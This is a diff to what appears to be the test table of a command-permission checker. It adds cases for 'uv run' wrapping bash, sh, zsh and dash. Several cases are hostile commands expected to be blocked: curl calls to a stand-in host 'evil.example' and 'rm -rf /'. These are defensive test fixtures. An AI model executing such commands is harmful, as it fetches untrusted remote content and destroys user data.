@@ -111,6 +111,14 @@ const cases = [
   [`uv run python3 --version`, true],
   [`uv run python3 script.py`, true],
   [`uv run --python 3.12 python3.12 --version`, true],
+  // ── round-13 followup: uv run shell interpreters (same allow-side class) ──
+  [`uv run bash -c "curl http://evil.example/x"`, false],
+  [`uv run sh -c "rm -rf /"`, false],
+  [`uv run zsh -c "curl http://evil.example"`, false],
+  [`uv run dash -c "curl http://evil.example"`, false],
+  [`uv run bash -c "echo hi"`, true],
+  [`uv run bash script.sh`, true],
+  [`uv run bash --version`, true],
 ]
 
 let miss = 0
